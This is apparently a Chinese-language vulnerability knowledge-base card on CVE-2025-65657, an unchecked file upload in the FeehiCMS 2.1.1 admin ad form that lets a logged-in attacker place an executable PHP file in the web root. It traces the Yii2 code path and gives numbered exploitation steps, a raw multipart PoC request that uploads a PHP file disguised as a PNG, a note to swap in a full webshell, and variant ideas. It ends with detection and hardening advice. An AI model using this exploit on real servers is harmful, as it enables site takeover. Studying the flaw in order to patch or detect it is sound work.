---
id: web-generic-file-upload-feehicms-ad-upload-saveas-rce
title: FeehiCMS 2.1.1 广告图片上传未校验扩展名：Yii2 saveAs 保留 php 后缀写入 Web 目录 RCE（CVE-2025-65657）
type: scenario
domain: web
path: web/generic/file-upload
technique: feehicms-ad-upload-saveas-rce
tags:
- php
- feehicms
- yii2
- file-upload
- unrestricted-upload
- webshell
- cve-2025-65657
cve:
- CVE-2025-65657
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: FeehiCMS 2.1.1（Yii2 2.0.53）
verification:
  verified_by: verifier-V36
  verified_at: '2026-11-05T06:00:37+08:00'
  notes: 已对照原文与全部图片核对：CreateAction→Service::create→save→insert→insertInternal→AdForm::beforeSave→Util::handleModelSingleFileUploadAbnormal→saveAs 链路、后台广告创建入口、落点 /uploads/setting/ad/20260131220058_697e0b1a8a34b.php 执行截图均一致；未在本机复现。CVE 归属按原文标记。
url: /docs/web/generic/file-upload/web-generic-file-upload-feehicms-ad-upload-saveas-rce/
draft: false
kb_aliases:
- CVE-2025-65657
- FeehiCMS 文件上传
- FeehiCMS 广告上传 getshell
- Yii2 广告表单上传
- handleModelSingleFileUploadAbnormal
- AdForm beforeSave
---

## 一句话结论

FeehiCMS 2.1.1 后台广告创建功能对上传的广告图片只按图片处理但没有扩展名白名单：`AdForm::beforeSave()` 调用 `Util::handleModelSingleFileUploadAbnormal()`，后者直接用 `UploadedFile::saveAs()` 把文件按“时间戳_随机串.原扩展名”写入 Web 目录；把 `phpinfo.php` 的 Content-Type 伪造成 `image/png` 上传，即可得到可执行的 PHP 文件。

## 原理

- 入口是后台广告创建：`CreateAction::run()` 通过 `call_user_func_array($this->doCreate, $createData)` 调用 Service 层 `create()`；`create()` 执行 `$model->load($postData) && $model->save()`。
- `BaseActiveRecord::save()` 判断新记录后走 `insert()` → `insertInternal()`，后者调用 `beforeSave(true)`；`AdForm::beforeSave()` 设置广告类型，并调用 `Util::handleModelSingleFileUploadAbnormal($this, 'ad', $this->advertisementFilepath, ...)` 处理上传字段。
- `Util::handleModelSingleFileUploadAbnormal()` 用 `UploadedFile::getInstance($model, $field)` 取文件，创建上传目录，拼接 `$fullName`（上传目录 + 生成的文件名），最后调用 `$upload->saveAs($fullName)`。
- 文件名由“时间戳_随机串 + 客户端原始扩展名”组成，扩展名没有白名单；`saveAs()` 本身也不校验内容/扩展名，直接把临时文件移动到 Web 可访问的 `frontend/web/uploads/setting/ad/` 下。
- PHP 按扩展名解析，`.php` 文件被访问即执行；Content-Type 只影响前端展示，不参与后缀决策，因此 image/png 伪装无效。
- 整条链没有任何一处检查扩展名、MIME、文件头或落点；后台表单的 `AdForm[ad]` 字段就是攻击者可控的文件对象。

## 触发条件

- FeehiCMS 2.1.1（默认依赖 Yii2 2.0.53）。
- 攻击者能登录后台并访问“运营管理 → 广告管理 → 创建”（需要有效后台会话与 CSRF token；弱口令/默认口令可降低门槛）。
- `frontend/web` 为 Web 根，`uploads/setting/ad/` 目录可写且 PHP 在该目录生效。
- 广告创建表单允许上传文件（`AdForm[ad]`）。

## 利用步骤

1. 登录后台，进入“运营管理 → 广告管理”，点击“创建”。
2. 填写必填的广告名称、提示、类型等字段，选择一张图片上传。
3. 抓包，将文件内容改为 `<?=phpinfo()?>`（或 WebShell），文件名改为 `phpinfo.php`，`Content-Type` 保持/改为 `image/png`。
4. 提交 `POST /admin/index.php?r=ad%2Fcreate`，服务端走 `save → insert → insertInternal → beforeSave → Util → saveAs`，文件落到 `uploads/setting/ad/<timestamp>_<random>.php`。
5. 刷新广告列表，在图片 `src` 或返回数据中找到文件路径；访问该 PHP 文件确认执行。
6. 替换为功能完整的 WebShell 并连接。

## PoC

关键 multipart 字段（省略普通表单字段）：

```http
POST /admin/index.php?r=ad%2Fcreate HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=----geckoformboundary

------geckoformboundary
Content-Disposition: form-data; name="AdForm[name]"

hacker
------geckoformboundary
Content-Disposition: form-data; name="AdForm[ad]"; filename="phpinfo.php"
Content-Type: image/png

<?=phpinfo()?>
------geckoformboundary--
```

（实际请求还需带 `_csrf_backend`、`BACKEND_FEEHICMS` Cookie 等后台会话字段。）

上传成功后访问：

```text
http://127.0.0.1/uploads/setting/ad/20260131220058_697e0b1a8a34b.php
```

页面输出 PHP 版本信息，证明 getshell。

## 变体与关联

- 其他使用 `Util::handleModelSingleFileUploadAbnormal()` 的后台表单（Banner、文章缩略图等）可能复用同一上传逻辑，均可尝试脚本后缀。
- 若 `options['filename']` 可由请求控制，还可尝试路径穿越或直接指定 `.php` 文件名。
- 根因与 Yii2 `UploadedFile::saveAs` 无过滤一致，见 [[web-php-framework-yii2-uploadedfile-saveas-unfiltered]]。
- 与 [[web-generic-file-upload-extension-zero-check]] 的差异：本卡给出 FeehiCMS 的完整业务调用链、后台入口与真实落点。
- 同类 Yii2 系 CMS 可复用该审计路径：`beforeSave` → 上传工具类 → `saveAs`。

## 检测与防御

- 升级 FeehiCMS 到包含修复的版本；关注 CVE-2025-65657 官方公告。
- 上传处理增加扩展名白名单（仅 jpg/png/gif/webp 等）、MIME 与文件头校验；重命名为随机串 + 白名单后缀，丢弃客户端原名。
- 上传目录移出 Web 根，或禁止该目录解析 PHP；对图片做二次渲染。
- 后台账号使用强口令、限制后台访问来源；广告创建等上传功能做权限最小化。
- 检测：`AdForm[ad]` 上传请求 filename 含 `.php`/`.phtml` 等后缀；`uploads/setting/ad/` 下出现脚本文件；访问该目录 PHP 返回 200 且响应含 PHP 版本/脚本输出；后台短时间内创建广告并上传异常文件。
